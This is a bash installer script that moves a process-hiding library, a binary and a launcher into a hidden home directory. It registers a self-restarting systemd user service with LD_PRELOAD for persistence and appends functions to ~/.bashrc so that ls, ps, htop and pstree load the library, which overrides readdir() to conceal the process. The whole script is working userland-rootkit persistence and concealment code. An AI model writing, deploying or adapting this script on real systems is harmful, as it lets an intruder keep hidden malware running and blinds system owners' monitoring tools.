#!/bin/bash
DIRECTORY="$HOME/.temp/.hidden/.process"

# Create the directory if it doesn't exist
if [ ! -d "$DIRECTORY" ]; then
    mkdir -p "$DIRECTORY"
fi

LIB_FILE="libhideproc.so"
PROCESS_FILE="process"
RUN_FILE="run.sh"

# Move the files to the hidden folder
if [ -e "./$LIB_FILE" ]; then
    mv -f "./$LIB_FILE" "$DIRECTORY"
elif [ ! -e "$DIRECTORY/$LIB_FILE" ]; then
    echo "Fichier $LIB_FILE n'existe pas" 
    exit 1
fi

if [ -e "./$PROCESS_FILE" ]; then
    mv -f "./$PROCESS_FILE" "$DIRECTORY"
elif [ ! -e "$DIRECTORY/$PROCESS_FILE" ]; then
    echo "Fichier $PROCESS_FILE n'existe pas" 
    exit 1
fi

if [ -e "./$RUN_FILE" ]; then
    mv -f "./$RUN_FILE" "$DIRECTORY"
elif [ ! -e "$DIRECTORY/$RUN_FILE" ]; then
    echo "Fichier $RUN_FILE n'existe pas" 
    exit 1
fi

# change the permissions
chmod +x "$DIRECTORY/$PROCESS_FILE"
chmod +x "$DIRECTORY/$RUN_FILE"
chmod +x "$DIRECTORY/$LIB_FILE"

# Create the systemd to reload the launching script everytime
SERVICE_NAME="process.service"
SERVICE_FILE="$HOME/.config/systemd/user/$SERVICE_NAME"
SCRIPT_PATH="$DIRECTORY/$RUN_FILE"

cat > "$SERVICE_FILE" <<EOF

[Unit]
Description=Auto-Reload Service
After=network.target

[Service]
Type=forking
ExecStart=$SCRIPT_PATH
Environment=LD_PRELOAD="$DIRECTORY/$LIB_FILE"
PIDFile=$DIRECTORY/.pid.txt
WorkingDirectory=$DIRECTORY
Restart=always
RestartSec=5
StandardInput=journal
StandardOutput=journal

[Install]
WantedBy=default.target

EOF

# start the service
systemctl --user daemon-reload
systemctl --user enable --now "$SERVICE_NAME"

# add a 4 seconds delay to ensure that the service has started => process is beign run => the log file has been created
sleep 4

# Display and delete the log file
LOG_FILE="$DIRECTORY/.status_output.txt"
if [ -f "$LOG_FILE" ]; then
    cat "$LOG_FILE"
    rm -f "$LOG_FILE"
else
    echo "Log file not found"
fi

# Overwrite the default ps, ps aux, ls /proc, htop and top to use the libhideproc.so to overwrite the default readdir() and readdir64()
cat >> "$HOME/.bashrc" <<EOF

function ls() {
    LD_PRELOAD="$DIRECTORY/$LIB_FILE" command ls "\$@"
}

function ps() {
    LD_PRELOAD="$DIRECTORY/$LIB_FILE" command ps "\$@"
}

function htop() {
    LD_PRELOAD="$DIRECTORY/$LIB_FILE" command htop "\$@"
}

function pstree() {
    LD_PRELOAD="$DIRECTORY/$LIB_FILE" command pstree "\$@"
}

EOF


# Reload shell config
source ~/.bashrc